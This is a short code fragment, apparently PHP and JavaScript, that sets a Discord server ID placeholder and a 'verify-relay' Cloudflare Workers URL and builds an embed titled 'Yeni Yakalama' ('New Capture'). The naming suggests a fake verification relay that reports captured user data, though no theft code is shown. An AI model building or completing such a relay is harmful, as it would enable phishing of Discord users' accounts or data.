...
define('GUILD_ID',     'SUNUCU_ID');
define('WORKER_URL',   'https://verify-relay.adi.workers.dev');
...
var embed={title:'Yeni Yakalama',color:0xF38020,description:desc,timestamp:now,fields:fields};
